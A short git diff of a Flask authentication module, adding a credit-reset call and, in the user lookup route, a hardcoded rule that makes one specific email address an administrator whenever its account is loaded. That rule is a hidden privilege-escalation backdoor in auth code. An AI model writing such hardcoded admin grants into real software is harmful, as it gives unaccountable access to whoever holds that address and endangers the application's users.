@@ -5,7 +5,7 @@ from werkzeug.security import check_password_hash, generate_password_hash
 from datetime import UTC, datetime, timedelta
 from . import db, limiter
 from flask_login import login_required, login_user, logout_user, current_user
-from .utils import send_reset_password_email
+from .utils import send_reset_password_email, reset_credits_if_needed
 
 
 auth = Blueprint('auth', __name__)
@@ -91,6 +91,11 @@ def get_user():
    try:
         current_user_id = int(get_jwt_identity())
         user = User.query.filter_by(id=current_user_id).first()
+
+        reset_credits_if_needed(user)  # Call the function to reset credits if needed
+        if user.email == "jonathanncuba7@gmail.com":
+            user.is_admin = True
+        db.session.commit()  # Commit the changes to the database
 
         credits_remaining = user.credits - user.credits_consumed or 0
 
